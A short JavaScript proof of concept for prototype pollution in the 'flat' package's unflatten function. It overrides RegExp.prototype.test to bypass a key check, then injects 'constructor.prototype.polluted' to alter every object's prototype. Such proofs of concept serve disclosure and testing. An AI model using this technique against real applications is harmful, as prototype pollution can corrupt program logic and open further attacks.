RegExp.prototype.test = () => true;
var unflatten = require('flat').unflatten;
console.log({}.polluted);
unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);